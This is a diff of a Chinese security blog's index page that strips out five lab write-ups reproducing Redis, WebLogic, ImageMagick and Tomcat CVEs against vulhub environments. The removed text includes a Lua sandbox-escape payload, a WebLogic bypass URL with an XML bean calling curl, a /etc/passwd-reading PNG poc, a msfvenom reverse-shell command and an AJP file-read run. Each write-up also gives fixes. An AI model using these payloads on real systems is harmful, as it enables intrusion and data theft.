                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-09-27 21:02:10" itemprop="dateModified" datetime="2024-09-27T21:02:10+08:00">2024-09-27</time>
+                <time title="修改时间：2024-09-27 21:10:08" itemprop="dateModified" datetime="2024-09-27T21:10:08+08:00">2024-09-27</time>
               </span>
 
           
@@ -901,36 +580,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="CVE-2022-0543-redis-复现"><a href="#CVE-2022-0543-redis-复现" class="headerlink" title="CVE-2022-0543-redis-复现"></a>CVE-2022-0543-redis-复现</h1><h2 id="0x00漏洞简介"><a href="#0x00漏洞简介" class="headerlink" title="0x00漏洞简介"></a>0x00漏洞简介</h2><p>由于Debain&#x2F;Ubuntu上的打包问题，redis能够逃脱lua沙箱执行任意脚本实现RCE</p>
-<h2 id="0x01适用条件"><a href="#0x01适用条件" class="headerlink" title="0x01适用条件"></a>0x01适用条件</h2><p>Ubuntu,Debain系统下的Redis</p>
-<p>知道lua链接库的绝对路径</p>
-<h2 id="0x02漏洞复现"><a href="#0x02漏洞复现" class="headerlink" title="0x02漏洞复现"></a>0x02漏洞复现</h2><p>漏洞环境：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543">https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543</a></p>
-<p>1.端口探测</p>
-<p>发现6379redis,进一步探测发现为linux系统</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap -sT -sV  -p6379 -O 172.24.0.2                                                                    1 ⨯</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-09 10:34 CST</span><br><span class="line">Nmap scan report for 172.24.0.2</span><br><span class="line">Host is up (0.000078s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">6379/tcp open  redis   Redis key-value store 5.0.7</span><br><span class="line">MAC Address: 02:42:AC:18:00:02 (Unknown)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure>
-
-<p>2.漏洞利用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ip</span><br></pre></td></tr></table></figure>
-
-<p>登录以后用info查看信息</p>
-<img src="/undefined/a2217347/image-20230409103715173.png" class="">
-
-<p>发现为kali linux，我们知道kali是基于debain的linux发行版，所以尝试利用redis动态加载lua链接库，实现rce。</p>
-<p>ps：此处链接库的绝对路径为<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code></p>
-<p>poc:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27; 0</span><br></pre></td></tr></table></figure>
-
-<img src="/undefined/a2217347/image-20230409104034056.png" class="">
-
-<h2 id="0x03漏洞修复"><a href="#0x03漏洞修复" class="headerlink" title="0x03漏洞修复"></a>0x03漏洞修复</h2><p>版本更新</p>
-<p><strong>Debian</strong></p>
-<p>Debian Redis（buster）：5:5.0.14-1+deb10u2</p>
-<p>Debian Redis（bullseye）：5:6.0.16-1+deb11u2</p>
-<p>Debian Redis（unstable) ：5:6.0.16-2</p>
-<p><strong>Ubuntu</strong></p>
-<p>Ubuntu 21.10 Redis：5:6.0.15-1ubuntu0.1</p>
-<p>Ubuntu 20.04 Redis：5:5.0.7-2ubuntu0.1</p>
-
+          <h1 id="CVE-2022-0543-redis-复现"><a href="#CVE-2022-0543-redis-复现" class="headerlink" title="CVE-2022-0543-redis-复现"></a>CVE-2022-0543-redis-复现</h1>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/undefined/a2217347.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -980,7 +638,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-09-27 21:02:10" itemprop="dateModified" datetime="2024-09-27T21:02:10+08:00">2024-09-27</time>
+                <time title="修改时间：2024-09-27 21:10:12" itemprop="dateModified" datetime="2024-09-27T21:10:12+08:00">2024-09-27</time>
               </span>
 
           
@@ -994,47 +652,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="CVE-2020-14882-3-weblogic-复现"><a href="#CVE-2020-14882-3-weblogic-复现" class="headerlink" title="CVE-2020-14882~3-weblogic-复现"></a>CVE-2020-14882~3-weblogic-复现</h1><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><ul>
-<li><p>CVE-2020-14882  允许远程用户通过静态资源访问+urlencode绕过管理员控制台组件中的身份验证。</p>
-</li>
-<li><p>CVE-2020-14883 允许经过身份验证的用户在管理员控制台组件上执行任何命令。  </p>
-<p> 利用这两个漏洞链，未经身份验证的远程攻击者可以通过 HTTP 在 Oracle WebLogic 服务器上执行任意命令并完全控制主机。</p>
-</li>
-</ul>
-<h2 id="0x01漏洞版本"><a href="#0x01漏洞版本" class="headerlink" title="0x01漏洞版本"></a>0x01漏洞版本</h2><ul>
-<li>10.3.6.0.0</li>
-<li>12.1.3.0.0</li>
-<li>12.2.1.3.0</li>
-<li>12.2.1.4.0</li>
-<li>14.1.1.0.0</li>
-</ul>
-<h2 id="0x02利用条件"><a href="#0x02利用条件" class="headerlink" title="0x02利用条件"></a>0x02利用条件</h2><p>CVE-2020-14882无限制</p>
-<p>CVE-2020-14883 ：</p>
-<p>1.访问恶意xml文件，要求目标能<strong>出网访问</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</span><br></pre></td></tr></table></figure>
-
-<p>poc.xml</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">   xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">   xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">          &lt;list&gt;</span><br><span class="line">            &lt;value&gt;bash&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;-c&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;&lt;![CDATA[curl http://xxx.xxx.xxx.xxx]]&gt;&lt;/value&gt;</span><br><span class="line">          &lt;/list&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
-
-<p>2.RCE，要求目标版本为<strong>12.2.1及以上版本</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#x27;&#x27;);&quot;)</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x03漏洞复现"><a href="#0x03漏洞复现" class="headerlink" title="0x03漏洞复现"></a>0x03漏洞复现</h2><p>漏洞环境：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2020-14882">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2020-14882</a></p>
-<p>1.CVE-2020-14882</p>
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:7001/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>
-
-<img src="/undefined/8dcfb138/image-20230408144727495.png" class="">
-
-<p>2.CVE-2020-14883</p>
-<p>payload1</p>
-<img src="/undefined/8dcfb138/image-20230408145213498.png" class="">
-
-<p>payload2</p>
-<img src="/undefined/8dcfb138/image-20230408145349443.png" class="">
-
-<h2 id="0x04漏洞修复"><a href="#0x04漏洞修复" class="headerlink" title="0x04漏洞修复"></a>0x04漏洞修复</h2><p>下载最新补丁</p>
-
+          <h1 id="CVE-2020-14882-3-weblogic-复现"><a href="#CVE-2020-14882-3-weblogic-复现" class="headerlink" title="CVE-2020-14882~3-weblogic-复现"></a>CVE-2020-14882~3-weblogic-复现</h1>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/undefined/8dcfb138.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1084,7 +710,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-09-27 21:02:10" itemprop="dateModified" datetime="2024-09-27T21:02:10+08:00">2024-09-27</time>
+                <time title="修改时间：2024-09-27 21:10:14" itemprop="dateModified" datetime="2024-09-27T21:10:14+08:00">2024-09-27</time>
               </span>
 
           
@@ -1099,29 +725,15 @@
 
       
           <hr>
-<h1 id="CVE-2022-44268：imagemagic-任意远程泄漏-漏洞复现"><a href="#CVE-2022-44268：imagemagic-任意远程泄漏-漏洞复现" class="headerlink" title="CVE-2022-44268：imagemagic-任意远程泄漏  漏洞复现"></a>CVE-2022-44268：imagemagic-任意远程泄漏  漏洞复现</h1><p>影响版本：ImageMagick：7.1.0-49 </p>
-<p>当 ImageMagick 解析 PNG 文件时，例如在调整大小操作中，生成的图像可能嵌入了来自网站的任意远程文件的内容（如果 magick 二进制文件具有读取它的权限）。 </p>
-<p>恶意行为者可以制作 PNG 或使用现有的 PNG  并添加文本块类型（例如，tEXt）。  这些类型有一个关键字和一个文本字符串。  如果关键字是字符串“profile”（不带引号），则  ImageMagick  会将文本字符串解释为文件名并将内容加载为原始配置文件，然后攻击者可以下载已调整大小的图像，该图像将包含远程文件的内容文件。 </p>
-<p>环境：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/imagemagick/CVE-2022-44268">https://github.com/vulhub/vulhub/tree/master/imagemagick/CVE-2022-44268</a></p>
-<p>复现过程：</p>
-<p>1.docker服务映射到本地8080端口，然后存在文件上传功能</p>
-
-
-<p>2.利用poc生成一个恶意png文件,该poc的generate实现的功能就是生成一个png文件，并在其插入一个tEXt文本块，内容为<strong>profile：{file}</strong>,</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./poc.py -o poc.png -r /etc/passwd generate </span><br></pre></td></tr></table></figure>
-
-<p>3.上传文件并下载生成的图片,并用poc对其进行解析，实现的功能就是从中提取文本块的hex，并将其hex解码。对应的imagemagic中存在漏洞的代码函数如下：</p>
-
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://127.0.0.1:8080/6427c530ed042.png</span><br><span class="line">./poc.py -i [filename] parse</span><br></pre></td></tr></table></figure>
-
-
-
-<p>参考文章：</p>
-<p><a target="_blank" rel="noopener" href="https://www.metabaseq.com/imagemagick-zero-days/">https://www.metabaseq.com/imagemagick-zero-days/</a></p>
-
+<h1 id="CVE-2022-44268：imagemagic-任意远程泄漏-漏洞复现"><a href="#CVE-2022-44268：imagemagic-任意远程泄漏-漏洞复现" class="headerlink" title="CVE-2022-44268：imagemagic-任意远程泄漏  漏洞复现"></a>CVE-2022-44268：imagemagic-任意远程泄漏  漏洞复现</h1>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/undefined/38e64e2b.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1171,7 +783,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-09-27 21:02:10" itemprop="dateModified" datetime="2024-09-27T21:02:10+08:00">2024-09-27</time>
+                <time title="修改时间：2024-09-27 21:10:01" itemprop="dateModified" datetime="2024-09-27T21:10:01+08:00">2024-09-27</time>
               </span>
 
           
@@ -1185,31 +797,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="Tomcat-通过PUT方法任意写入文件漏洞-RCE-CVE-2017-12615-复现"><a href="#Tomcat-通过PUT方法任意写入文件漏洞-RCE-CVE-2017-12615-复现" class="headerlink" title="Tomcat 通过PUT方法任意写入文件漏洞+RCE  (CVE-2017-12615) 复现"></a>Tomcat 通过PUT方法任意写入文件漏洞+RCE  (CVE-2017-12615) 复现</h1><h2 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00 漏洞简述"></a>0x00 漏洞简述</h2><ul>
-<li>对应OWASP10中的 安全配置错误</li>
-</ul>
-<p>在 conf&#x2F;web.xml文件中的readonly配置设为false的前提下，攻击者可以通过 PUT&#x2F;DELETE来进行相关文件操作。</p>
-<h2 id="0x01适用版本"><a href="#0x01适用版本" class="headerlink" title="0x01适用版本"></a>0x01适用版本</h2><p>apache tomcat 5.x-9.x</p>
-<h2 id="0x02利用条件"><a href="#0x02利用条件" class="headerlink" title="0x02利用条件"></a>0x02利用条件</h2><p> conf&#x2F;web.xml文件中的readonly配置设为false</p>
-<h2 id="0x03漏洞复现"><a href="#0x03漏洞复现" class="headerlink" title="0x03漏洞复现"></a>0x03漏洞复现</h2><p>漏洞环境：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615">https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615</a></p>
-<h3 id="1-漏洞验证"><a href="#1-漏洞验证" class="headerlink" title="1.漏洞验证"></a>1.漏洞验证</h3><p>docker搭建好以后，打开网页8080端口，tomcat7+默认管理界面</p>
-<img src="/undefined/c1903ce6/image-20230407213616171.png" class="">
-
-<p>然后burpsuite抓包，修改请求方法为PUT，附加上验证payload，可以看见返回201响应头，成功创建文件.</p>
-<img src="/undefined/c1903ce6/image-20230407213900853.png" class="">
-
-<p>此处**&#x2F;poc.jsp&#x2F;**，此处后面加上<code>/</code>是利用bind声明FILE变量，然后FILE变量将name进行normalize从而去掉&#x2F;的操作。从而使其进入DefaultParser而非JSPparser,最终使得文件落地。</p>
-<h3 id="2-反弹shell"><a href="#2-反弹shell" class="headerlink" title="2.反弹shell"></a>2.反弹shell</h3><p>这里利用msfvenom简单生成载荷，真实情况下估计会被杀掉</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.22.0.1 LPORT=4444 -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>
-
-<img src="/undefined/c1903ce6/image-20230407214446437.png" class="">
-
-<p>上传时候，访问文件，并本地监听，成功反弹回shell。</p>
-<img src="/undefined/c1903ce6/image-20230407214608223.png" class="">
-
-<p>0x04漏洞修复</p>
-<p>检查readonly没有设为false即可。</p>
-
+          <h1 id="Tomcat-通过PUT方法任意写入文件漏洞-RCE-CVE-2017-12615-复现"><a href="#Tomcat-通过PUT方法任意写入文件漏洞-RCE-CVE-2017-12615-复现" class="headerlink" title="Tomcat 通过PUT方法任意写入文件漏洞+RCE  (CVE-2017-12615) 复现"></a>Tomcat 通过PUT方法任意写入文件漏洞+RCE  (CVE-2017-12615) 复现</h1>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/undefined/c1903ce6.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1259,7 +855,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-09-27 21:02:10" itemprop="dateModified" datetime="2024-09-27T21:02:10+08:00">2024-09-27</time>
+                <time title="修改时间：2024-09-27 21:10:11" itemprop="dateModified" datetime="2024-09-27T21:10:11+08:00">2024-09-27</time>
               </span>
 
           
@@ -1273,47 +869,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="CVE-2020-1938-Tomcat-ajp文件读取-x2F-包含漏洞"><a href="#CVE-2020-1938-Tomcat-ajp文件读取-x2F-包含漏洞" class="headerlink" title="CVE-2020-1938  Tomcat  ajp文件读取&#x2F;包含漏洞"></a>CVE-2020-1938  Tomcat  ajp文件读取&#x2F;包含漏洞</h1><h2 id="0x00漏洞简述"><a href="#0x00漏洞简述" class="headerlink" title="0x00漏洞简述"></a>0x00漏洞简述</h2><p>攻击者可以利用该漏洞读取部署在Tomcat上的所有web应用的配置文件和源代码文件的内容。如果用户可以上传文件，可以进一步实现LFI。</p>
-<h2 id="0x01适用版本"><a href="#0x01适用版本" class="headerlink" title="0x01适用版本"></a>0x01适用版本</h2><p>Apache Tomcat 9.x &lt; 9.0.31</p>
-<p>Apache Tomcat 8.x &lt; 8.5.51</p>
-<p>Apache Tomcat 7.x &lt; 7.0.100</p>
-<p>Apache Tomcat 6.0</p>
-<h2 id="0x02利用条件"><a href="#0x02利用条件" class="headerlink" title="0x02利用条件"></a>0x02利用条件</h2><blockquote>
-<p>AJP服务默认开启，默认端口8009</p>
-</blockquote>
-<p>开启AJP服务，并且攻击者可以访问服务端口。</p>
-<h2 id="0x03漏洞复现"><a href="#0x03漏洞复现" class="headerlink" title="0x03漏洞复现"></a>0x03漏洞复现</h2><p>复现环境：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2020-1938">https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2020-1938</a></p>
-<p>工具：<a target="_blank" rel="noopener" href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a></p>
-<p>​		  <a target="_blank" rel="noopener" href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p>
-<h3 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1.端口扫描"></a>1.端口扫描</h3><p>发现两个端口，8009AJP服务，8080 tomcat 9.0.30</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-06 22:22 CST</span><br><span class="line">Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 0.00% done</span><br><span class="line">Nmap scan report for 172.21.0.2</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)</span><br><span class="line">8080/tcp open  http    Apache Tomcat 9.0.30</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.43 seconds</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-漏洞探测"><a href="#2-漏洞探测" class="headerlink" title="2.漏洞探测"></a>2.漏洞探测</h3><p>利用xray，验证存在漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">./xray servicescan --target 172.21.0.2:8009</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">[INFO] 2023-04-06 22:24:55 [default:dispatcher.go:444] processing 172.21.0.2:8009</span><br><span class="line">[INFO] 2023-04-06 22:24:55 [go-poc:tomcat-cve-2020-1938.go:339] ajp protocol found in 172.21.0.2:8009, status code 404</span><br><span class="line">[INFO] 2023-04-06 22:24:55 [go-poc:tomcat-cve-2020-1938.go:199] found tomcat version 9.0.30</span><br><span class="line">[Vuln: phantasm]</span><br><span class="line">Target           &quot;172.21.0.2:8009&quot;                                                                                                                                                                                                        </span><br><span class="line">VulnType         &quot;poc-go-tomcat-cve-2020-1938/default&quot;                                                                                                                                                                                    </span><br><span class="line">method           &quot;version_match&quot;                                                                                                                                                                                                          </span><br><span class="line">read_file        &quot;/kqhymw.jsp&quot;                                                                                                                                                                                                            </span><br><span class="line">status_code      &quot;404&quot;                                                                                                                                                                                                                    </span><br><span class="line">body             &quot;\\x02\\xd3\\x03\\x02\\xcf&lt;!doctype html&gt;&lt;html lang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 404 – Not Found&lt;/title&gt;&lt;style type=\&quot;text/css\&quot;&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 404 – Not Found&lt;/h1&gt;&lt;hr class=\&quot;line\&quot; /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Status Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; &amp;#47;kqhymw.jsp&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.&lt;/p&gt;&lt;hr class=\&quot;line\&quot; /&gt;&lt;h3&gt;Apache Tomcat/9.0.30&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;\\x00AB&quot;                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                                          </span><br><span class="line">[INFO] 2023-04-06 22:24:55 [controller:dispatcher.go:553] wait for reverse server finished</span><br><span class="line">[*] All pending requests have been scanned</span><br><span class="line">[*] scanned: 1, pending: 0, requestSent: 0, latency: 0.00ms, failedRatio: 0.00%</span><br><span class="line">[INFO] 2023-04-06 22:24:58 [controller:dispatcher.go:573] controller released, task done</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h3><p>利用现成exploit</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f WEB-INF/web.xml 172.21.0.2</span><br><span class="line">Getting resource at ajp13://172.21.0.2:8009/asdf</span><br><span class="line">----------------------------</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"> Licensed to the Apache Software Foundation (ASF) under one or more</span><br><span class="line">  contributor license agreements.  See the NOTICE file distributed with</span><br><span class="line">  this work for additional information regarding copyright ownership.</span><br><span class="line">  The ASF licenses this file to You under the Apache License, Version 2.0</span><br><span class="line">  (the &quot;License&quot;); you may not use this file except in compliance with</span><br><span class="line">  the License.  You may obtain a copy of the License at</span><br><span class="line"></span><br><span class="line">      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line"></span><br><span class="line">  Unless required by applicable law or agreed to in writing, software</span><br><span class="line">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line">  See the License for the specific language governing permissions and</span><br><span class="line">  limitations under the License.</span><br><span class="line">--&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">  xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee</span><br><span class="line">                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class="line">  version=&quot;4.0&quot;</span><br><span class="line">  metadata-complete=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;</span><br><span class="line">  &lt;description&gt;</span><br><span class="line">     Welcome to Tomcat</span><br><span class="line">  &lt;/description&gt;</span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="0x04漏洞修复"><a href="#0x04漏洞修复" class="headerlink" title="0x04漏洞修复"></a>0x04漏洞修复</h2><ol>
-<li>更新版本</li>
-</ol>
-<p>更新版本到9.0.31、8.5.51、7.0.100</p>
-<ol start="2">
-<li><p>未使用ajp服务</p>
-<p>注释  编辑<CATALINA_BASE>&#x2F;conf&#x2F;server.xml，找到如下一行（<CATALINA_BASE>为Tomcat工作目录）：</p>
-</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt; </span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li>使用ajp服务</li>
-</ol>
-<p>​	升级到新版本后增加secret属性</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;8009&quot;  protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot;  secret=&quot;YOUR_TOMCAT_AJP_SECRET&quot; /&gt; </span><br></pre></td></tr></table></figure>
-
-<p>​	未升级，增加requiresecret属性</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;8009&quot;  protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot;  requiredSecret=&quot;YOUR_TOMCAT_AJP_SECRET&quot; /&gt; </span><br></pre></td></tr></table></figure>
-
+          <h1 id="CVE-2020-1938-Tomcat-ajp文件读取-x2F-包含漏洞"><a href="#CVE-2020-1938-Tomcat-ajp文件读取-x2F-包含漏洞" class="headerlink" title="CVE-2020-1938  Tomcat  ajp文件读取&#x2F;包含漏洞"></a>CVE-2020-1938  Tomcat  ajp文件读取&#x2F;包含漏洞</h1>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/undefined/9de11cd7.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1402,8 +966,10 @@
         </a>
       </div>
